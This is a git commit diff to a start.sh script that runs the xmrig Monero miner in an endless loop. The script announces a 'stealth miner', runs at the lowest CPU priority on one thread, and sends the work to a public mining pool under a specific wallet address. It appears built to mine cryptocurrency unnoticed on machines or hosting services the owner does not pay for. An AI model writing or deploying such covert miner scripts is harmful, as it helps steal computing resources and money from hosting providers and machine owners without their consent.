d4032d8f226a6a6b742fcfd311106d146156b505
Zelticu <Zelticue@gmail.com>
2025-07-18 16:30:36 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
-chmod +x xmrig
+
+# Give permission to run
+chmod +x ./xmrig
+
 while true; do
   echo "⛏️ Starting stealth miner..."
   nice -n 19 ./xmrig -o pool.supportxmr.com:443 -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm -k --tls -t 1 --cpu-priority=1 --randomx-mode=light
